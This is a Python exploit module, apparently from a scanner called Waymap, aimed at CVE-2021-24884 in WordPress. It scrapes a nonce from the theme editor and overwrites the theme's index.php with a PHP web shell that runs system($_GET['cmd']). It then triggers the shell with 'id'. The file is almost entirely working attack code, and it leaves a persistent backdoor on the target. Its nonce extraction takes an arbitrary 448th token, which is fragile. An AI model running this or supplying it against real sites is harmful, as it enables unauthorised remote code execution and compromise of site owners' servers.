# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-24884 - WordPress Formidable Forms Plugin Vulnerability (RCE via XSS & CSRF)

import requests
import re
from colorama import init, Fore, Style

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def extract_wp_nonce(target):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Extracting wp_nonce from the theme editor page...")
    editor_url = f"{target}/wp-admin/theme-editor.php?file=index.php"
    
    try:
        response = requests.get(editor_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        if response.status_code == 200:
            nonce_pattern = re.compile(r'[a-z0-9]{10}')
            matches = nonce_pattern.findall(response.text)
            if len(matches) > 447: 
                wp_nonce = matches[447]
                print(f"{Style.BRIGHT}{Fore.GREEN}[•] Extracted wp_nonce: {wp_nonce}")
                return wp_nonce
            else:
                print(f"{Style.BRIGHT}{Fore.RED}[•] Could not find the wp_nonce.")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Failed to fetch the theme editor page.")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error while extracting nonce: {e}")
    
    return None

def modify_index_file(target, wp_nonce):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Attempting to modify index.php with RCE payload...")
    
    payload = {
        'nonce': wp_nonce,
        '_wp_http_referer': '/wp-admin/theme-editor.php?file=index.php&theme=twentytwentyone',
        'newcontent': '''<?php
        // RCE Payload to execute system commands
        echo system($_GET['cmd']);
        ?>''',
        'action': 'edit-theme-plugin-file',
        'file': 'index.php',
        'theme': 'twentytwentyone',
        'docs-list': ''
    }
    
    try:
        ajax_url = f"{target}/wp-admin/admin-ajax.php"
        response = requests.post(ajax_url, headers={"User-Agent": "Mozilla/5.0"}, data=payload, verify=False, timeout=30)
        
        if response.status_code == 200 and "true" in response.text:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] Successfully modified index.php with the RCE payload.")
            return True
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Failed to modify index.php.")
            return False
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error during modification attempt: {e}")
        return False

def trigger_rce(target):
    print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Triggering RCE via cmd parameter...")
    
    try:
        rce_url = f"{target}/index.php?cmd=id"
        response = requests.get(rce_url, headers={"User-Agent": "Mozilla/5.0"}, verify=False, timeout=30)
        
        if response.status_code == 200:
            print(f"{Style.BRIGHT}{Fore.GREEN}[•] RCE executed successfully. Output: \n{response.text}")
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Failed to trigger RCE.")
    except Exception as e:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Error triggering RCE: {e}")

def scan_cve_2021_24884(target):
    wp_nonce = extract_wp_nonce(target)
    
    if wp_nonce:
        if modify_index_file(target, wp_nonce):
            trigger_rce(target)
        else:
            print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed.")
    else:
        print(f"{Style.BRIGHT}{Fore.RED}[•] Could not extract wp_nonce. Exploit aborted.")